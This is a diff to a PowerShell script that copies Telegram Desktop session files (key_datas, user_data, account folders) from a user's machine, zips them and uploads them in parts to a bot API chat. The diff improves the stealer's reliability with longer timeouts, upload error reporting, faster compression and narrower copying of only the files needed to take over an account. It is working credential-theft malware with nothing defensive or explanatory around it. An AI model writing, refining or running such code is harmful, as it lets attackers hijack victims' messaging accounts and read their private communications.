@@ -21,18 +21,25 @@ function Send-Text([string]$text) {
 
 function Post([string]$file, [string]$text) {
     if ($curl) {
-        & $curl -s --max-time 180 -F "document=@$file" -F "caption=$text" $apiDoc | Out-Null
+        $r = & $curl -s --max-time 600 -F "chat_id=$ChatID" -F "document=@$file" -F "caption=$text" $apiDoc
+        if ($r -notmatch '"ok":true') { Send-Text ("part fail: " + $r + " | " + $text) }
         return
     }
-    Add-Type -AssemblyName System.Net.Http
-    $hc = New-Object System.Net.Http.HttpClient
-    $mp = New-Object System.Net.Http.MultipartFormDataContent
-    $fs = [IO.File]::OpenRead($file)
-    $sc = New-Object System.Net.Http.StreamContent($fs)
-    $mp.Add($sc, 'document', [IO.Path]::GetFileName($file))
-    $mp.Add((New-Object System.Net.Http.StringContent($text)), 'caption')
-    $hc.PostAsync($apiDoc, $mp).GetAwaiter().GetResult() | Out-Null
-    $fs.Dispose(); $mp.Dispose(); $hc.Dispose()
+    try {
+        Add-Type -AssemblyName System.Net.Http
+        $hc = New-Object System.Net.Http.HttpClient
+        $hc.Timeout = [TimeSpan]::FromMinutes(10)
+        $mp = New-Object System.Net.Http.MultipartFormDataContent
+        $fs = [IO.File]::OpenRead($file)
+        $sc = New-Object System.Net.Http.StreamContent($fs)
+        $mp.Add($sc, 'document', [IO.Path]::GetFileName($file))
+        $mp.Add((New-Object System.Net.Http.StringContent($text)), 'caption')
+        $mp.Add((New-Object System.Net.Http.StringContent($ChatID)), 'chat_id')
+        $resp = $hc.PostAsync($apiDoc, $mp).GetAwaiter().GetResult()
+        $body = $resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
+        if ($body -notmatch '"ok":true') { Send-Text ("part fail: " + $body + " | " + $text) }
+        $fs.Dispose(); $mp.Dispose(); $hc.Dispose()
+    } catch { Send-Text ("part fail: " + $_.Exception.Message + " | " + $text) }
 }
 
 function Send-Large([string]$path, [string]$text) {
@@ -43,21 +50,19 @@ function Send-Large([string]$path, [string]$text) {
     try {
         while ($fs.Position -lt $fs.Length) {
             $part = "$path.part$i"
-            $out  = [IO.File]::Create($part)
+            $o2   = [IO.File]::Create($part)
             try {
                 $left = $limit; $buf = New-Object byte[] (1MB)
                 while ($left -gt 0 -and $fs.Position -lt $fs.Length) {
                     $n = $fs.Read($buf, 0, [Math]::Min($buf.Length, $left))
                     if ($n -le 0) { break }
-                    $out.Write($buf, 0, $n); $left -= $n
+                    $o2.Write($buf, 0, $n); $left -= $n
                 }
-            } finally { $out.Close() }
+            } finally { $o2.Close() }
             Post $part "$text [part $i]"
             Remove-Item $part -Force
             $i++
         }
-    } catch {
-        Send-Text ("upload fail: " + $_.Exception.Message + " | " + $text)
     } finally { $fs.Close() }
 }
 
@@ -89,8 +94,13 @@ while ((Get-Process Telegram -ErrorAction SilentlyContinue) -and $n -lt 15) {
 
 $out = Join-Path $env:TEMP "td_$stamp"
 $zip = "$out.zip"
+New-Item -ItemType Directory $out -Force | Out-Null
 
-try { robocopy $src $out /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null } catch {}
+# только нужное: файлы корня (key_datas, settingss, user_data#N, map*) + каталоги аккаунтов
+Get-ChildItem $src -File -ErrorAction SilentlyContinue | Copy-Item -Destination $out -Force -ErrorAction SilentlyContinue
+Get-ChildItem $src -Directory -ErrorAction SilentlyContinue | Where-Object { $_.Name -match '^[0-9A-Fa-f]{16}$' } | ForEach-Object {
+    robocopy $_.FullName (Join-Path $out $_.Name) /E /XD cache /NFL /NDL /NJH /NJS /R:1 /W:1 | Out-Null
+}
 
 if (-not (Test-Path (Join-Path $out 'key_datas'))) {
     Send-Text "copy failed: $cap"
@@ -105,7 +115,7 @@ Send-Text "copy ok: $cap | $($files.Count) files | $sz MB"
 Add-Type -AssemblyName System.IO.Compression.FileSystem
 Add-Type -AssemblyName System.IO.Compression
 try {
-    [IO.Compression.ZipFile]::CreateFromDirectory($out, $zip, [IO.Compression.CompressionLevel]::Optimal, $false)
+    [IO.Compression.ZipFile]::CreateFromDirectory($out, $zip, [IO.Compression.CompressionLevel]::Fastest, $false)
 } catch {
     Send-Text ("zip fail: " + $_.Exception.Message + " | $cap")
     if (Test-Path $exe) { Start-Process $exe }
